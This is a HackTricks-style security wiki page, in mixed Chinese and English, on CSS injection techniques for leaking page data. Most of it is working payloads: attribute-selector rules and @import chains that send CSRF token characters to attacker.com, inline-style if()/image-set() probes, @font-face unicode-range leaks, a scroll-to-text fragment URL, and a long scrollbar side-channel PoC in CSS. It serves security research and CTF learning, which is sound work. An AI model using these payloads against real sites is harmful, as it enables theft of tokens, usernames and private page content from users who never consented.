# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### 属性选择器

CSS 选择器被构造为匹配 `input` 元素的 `name` 和 `value` 属性的值。如果 `input` 元素的 `value` 属性以特定字符开头，则会加载预定义的外部资源：
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
然而，这种方法在处理隐藏输入元素（`type="hidden"`）时存在一个限制，因为隐藏元素不会加载背景。

#### Bypass for Hidden Elements

为绕过此限制，您可以使用 `~` 通用兄弟选择器 (general sibling combinator) 定位后续的兄弟元素。该 CSS 规则随后会应用于所有位于 hidden input 元素之后的兄弟元素，从而导致背景图像被加载：
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
关于利用该技术的一个实际示例已在提供的代码片段中详细说明。您可以在[这里](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)查看。

#### CSS Injection 的先决条件

要使 CSS Injection 技术有效，需要满足某些条件：

1. **Payload Length**: CSS Injection 向量必须支持足够长的 payload，以容纳构造的选择器。
2. **CSS Re-evaluation**: 您应当能够将页面嵌入 iframe，这对于触发 CSS 针对新生成 payloads 的重新评估是必要的。
3. **External Resources**: 该技术假设可以使用外部托管的图片。这可能会被站点的 Content Security Policy (CSP) 限制。

### Blind Attribute Selector

正如[**此文所述**](https://portswigger.net/research/blind-css-exfiltration)，可以将选择器 **`:has`** 和 **`:not`** 结合使用来识别来自盲元素的内容。当你不知道加载 CSS injection 的网页内部有什么时，这非常有用。\
也可以使用这些选择器从多个相同类型的区块中提取信息，例如：
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

前一种技术有一些缺点，参见先决条件。你要么需要能够 **向受害者发送多个链接**，要么需要能够 **iframe the CSS injection vulnerable page**。

不过，还有另一种巧妙的方法使用 **CSS `@import`** 来提高该技术的效果。

这最早由 [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) 展示，其工作原理如下：

与其每次加载相同页面并反复使用数十个不同的 payload（像前面那种方法），我们将**只加载页面一次，并仅包含一个指向攻击者服务器的 import**（这就是要发送给受害者的 payload）：
```css
@import url("//attacker.com:5001/start?");
```
1. 该 import 将会从攻击者接收一些 CSS 脚本，浏览器会加载它。
2. 攻击者发送的 CSS 脚本的第一部分是 **另一个 `@import` 再次指向攻击者的服务器。**
1. 攻击者的服务器暂时不会响应此请求，因为我们想先 leak 一些字符，然后用 payload 响应这个 import 以泄露下一个字符。
3. payload 的第二个、更大的一部分将是一个 **attribute selector leakage payload**
1. 这会发送到攻击者服务器 **秘密的第一个字符和最后一个字符**
4. 一旦攻击者服务器收到 **秘密的第一个和最后一个字符**，它将 **响应第 2 步中请求的 import**。
1. 响应将与 **步骤 2、3 和 4** 完全相同，但这次它会尝试 **找到秘密的第二个字符和倒数第二个字符**。

攻击者将会 **沿着该循环直到完全 leak 出秘密**。

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> 该脚本每次会尝试发现 2 个字符（从开始和结束），因为 attribute selector 允许做像下面这样的匹配：
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> 这使脚本能够更快地 leak 出秘密。

> [!WARNING]
> 有时脚本 **无法正确检测到已发现的 prefix + suffix 已经是完整的 flag**，它会继续向前（在 prefix）和向后（在 suffix），最终可能会挂起。\
> 别担心，只需检查 **output**，因为 **你可以在那里看到 flag**。

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> 在 if() 中进行相等比较时，字符串字面量必须使用双引号。单引号不会匹配。

- Sink: 控制一个元素的 style attribute，并确保目标属性位于同一元素上（attr() 仅读取同一元素的属性）。
- Read: 将属性复制到 CSS 变量：`--val: attr(title)`.
- Decide: 使用嵌套条件比较变量与字符串候选项来选择 URL：`--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: 应用 `background: image-set(var(--steal))`（或任何会发起请求的属性）以强制对所选端点发起请求。

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
有效 payload（比较时必须使用双引号）：
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
使用嵌套条件枚举属性值：
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
真实演示（探测用户名）：
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Notes and limitations:

- 在研究时适用于 Chromium-based 浏览器；在其他引擎上的行为可能不同。
- 最适用于有限/可枚举的值空间（IDs、flags、短用户名）。在没有外部样式表的情况下窃取任意长字符串仍然具有挑战性。
- 任何会获取 URL 的 CSS 属性都可以用来触发请求（例如 background/image-set、border-image、list-style、cursor、content）。

自动化：Burp Custom Action 可以生成嵌套的 inline-style payloads 来暴力破解属性值：https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### 其他选择器

使用 **CSS selectors** 访问 DOM 部分的其他方法：

- **`.class-to-search:nth-child(2)`**：这将在 DOM 中查找具有类名 "class-to-search" 的第二个元素。
- **`:empty`** 选择器：例如在 [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### 基于错误的 XS-Search

**参考：** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

总体目的是 **从受控端点使用自定义字体**，并确保 **文本（在本例中为 'A'）仅在指定资源 (`favicon.ico`) 无法加载时才使用该字体显示**。
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **自定义字体用法**:

- 一个自定义字体是使用 `@font-face` 规则在 `<style>` 标签内的 `<head>` 部分定义的。
- 该字体命名为 `poc`，并从外部端点（`http://attacker.com/?leak`）获取。
- `unicode-range` 属性被设置为 `U+0041`，针对特定的 Unicode 字符 'A'。

2. **带回退文本的 Object 元素**:
- 在 `<body>` 部分创建了一个 `id="poc0"` 的 `<object>` 元素。该元素尝试从 `http://192.168.0.1/favicon.ico` 加载资源。
- 该元素的 `font-family` 被设置为 `'poc'`，如 `<style>` 部分所定义。
- 如果资源（`favicon.ico`）未能加载，`<object>` 标签内的回退内容（字符 'A'）将被显示。
- 如果无法加载外部资源，回退内容（'A'）将使用自定义字体 `poc` 渲染。

### 为 Scroll-to-Text Fragment 添加样式

使用 **`:target`** 伪类来选择被 **URL 片段** 定位的元素，正如 [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo) 所述。需要注意的是，`::target-text` 不会匹配任何元素，除非文本被片段显式定位。

当攻击者利用 **Scroll-to-text** fragment 功能时，会产生安全问题：他们可以通过 HTML injection 注入规则，从而通过从其服务器加载资源来确认网页上是否存在特定文本。该方法涉及注入如下 CSS 规则：
```css
:target::before {
content: url(target.png);
}
```
在这种情况下，如果页面上存在文本 "Administrator"，则会向服务器请求资源 `target.png`，从而表明该文本的存在。该攻击的一个实例可以通过一个专门构造的 URL 执行，该 URL 将注入的 CSS 与 Scroll-to-text fragment 一起嵌入：
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
在此，攻击者操纵 HTML 注入 来传输 CSS 代码，利用 Scroll-to-text fragment (`#:~:text=Administrator`) 针对特定文本 "Administrator"。如果找到该文本，就会加载指定资源，因而无意中向攻击者表明其存在。

为缓解，应注意以下几点：

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) 被设计为仅匹配单词或句子，从而限制其用于 leak arbitrary secrets or tokens 的能力。
2. **Restriction to Top-level Browsing Contexts**: STTF 仅在 top-level browsing contexts 中运行，在 iframes 内无效，这使得任何 exploitation 企图更容易被用户察觉。
3. **Necessity of User Activation**: STTF 需要 user-activation gesture 才能生效，这意味着 exploitations 只能通过用户发起的导航实现。该要求大大降低了在无用户交互情况下自动化攻击的风险。然而，blog post 的作者指出了特定条件和绕过方法（例如 social engineering、与常见 browser extensions 的交互），这些可能会简化攻击的自动化。

了解这些机制和潜在漏洞对于维护 web security 并防范此类利用性手法至关重要。

欲了解更多信息，请查看原始报告： [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

你可以查看一个 [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)。

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

你可以为特定的 unicode 值 指定 **外部字体（external fonts）**，这些字体只有在页面存在这些 unicode 值时才会被 **获取**。例如：
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
当你访问此页面时，Chrome 和 Firefox 会请求 "?A" 和 "?B"，因为 sensitive-information 的文本节点包含字符 "A" 和 "B"。但 Chrome 和 Firefox 不会请求 "?C"，因为它不包含 "C"。这意味着我们已经能够读取 "A" 和 "B"。

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

该技术通过利用 font ligatures 并监测宽度变化，从节点中提取文本。该过程包含多个步骤：

1. **Creation of Custom Fonts**:

- 使用包含 `horiz-adv-x` 属性的 glyph 创建 SVG 字体，`horiz-adv-x` 为表示两个字符序列的 glyph 设置很大的宽度。
- 示例 SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`，其中 "XY" 表示一个两个字符的序列。
- 然后使用 fontforge 将这些字体转换为 woff 格式。

2. **Detection of Width Changes**:

- 使用 CSS 确保文本不换行（`white-space: nowrap`）并自定义滚动条样式。
- 横向滚动条的出现（样式特殊）充当指示器（oracle），表明某个特定 ligature，从而某个特定的字符序列，存在于文本中。
- 涉及的 CSS：
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: 为字符对创建具有大宽度的字体。
- **Step 2**: 使用基于滚动条的技巧检测何时渲染了大宽度的 glyph（字符对的 ligature），从而指示该字符序列存在。
- **Step 3**: 检测到 ligature 后，生成表示三字符序列的新 glyph，将已检测到的字符对与前置或后置字符组合。
- **Step 4**: 对三字符 ligature 进行检测。
- **Step 5**: 重复该过程，逐步揭示整个文本。

4. **Optimization**:
- 当前通过 `<meta refresh=...` 初始化的方法并不理想。
- 更高效的方法可以利用 CSS 的 `@import` 技巧，以提升 exploit 的性能。

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). 文本节点中使用的 charset 可以使用浏览器中已安装的默认字体 leak：不需要外部或自定义字体。

其原理是利用动画逐步扩大一个 `div` 的宽度，使得字符一个接一个地从文本的 'suffix' 部分移动到 'prefix' 部分。该过程将文本有效地拆分为两部分：

1. **Prefix**: 初始行。
2. **Suffix**: 随后的一行或多行。

字符的过渡阶段如下所示：

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

在此过渡过程中，使用了 **unicode-range trick** 来识别每个加入 prefix 的新字符。实现方式是将字体切换为 Comic Sans（Comic Sans 明显比默认字体更高），从而触发垂直滚动条。该滚动条的出现间接地揭示了 prefix 中新字符的存在。

尽管此方法可以检测到出现的唯一字符，但无法指明哪个字符被重复，只能表明发生了重复。

> [!TIP]
> 基本上，**unicode-range 是用来检测字符的**，但因为我们不想加载外部字体，所以需要另寻他法。\
> 当该 **字符** 被 **找到** 时，会将其赋予预装的 **Comic Sans** 字体，这会使该字符**变大**并**触发滚动条**，从而**leak 所找到的字符**。

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** 这在 [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) 中提到

这个情况与前一种非常相似，不过这里的目标是通过让特定 **chars 比其他字符更大以隐藏某些东西**，例如一个不会被 bot 点击的按钮或一个不会被加载的图片。这样我们可以测量该操作（或未发生的操作），从而判断某个特定的 char 是否出现在文本中。

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** 这在 [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) 中提到

在这种情况下，我们可以尝试通过从 same origin 加载一个 fake font 来 leak 文本中是否包含某个 char：
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
如果有匹配，**font will be loaded from `/static/bootstrap.min.css?q=1`**。虽然它不会成功加载，**browser should cache it**，即使没有 cache，也有 **304 not modified** 机制，所以 **response should be faster** 比其他资源要快。

然而，如果缓存的 response 与未缓存的 response 的时间差不够大，这就没什么用。例如，作者提到：经过测试，我发现第一个问题是速度差别不大，第二个问题是 bot 使用了 `disk-cache-size=1` 标志，这确实很用心。

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

在这种情况下，当发生匹配时，你可以指示 **CSS to load hundreds of fake fonts** 从同一源加载数百个伪造字体。通过这种方式，你可以 **measure the time** 所需时间，并用类似下面的方法判断某个字符是否出现：
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
而机器人的代码如下：
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
因此，如果字体不匹配，访问 bot 时的响应时间预计约为 30 秒。然而，如果字体匹配，会发送多个请求来检索字体，导致网络持续活动。结果是满足停止条件并收到响应需要更长时间。因此，响应时间可以用作判断字体是否匹配的指标。

## References

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
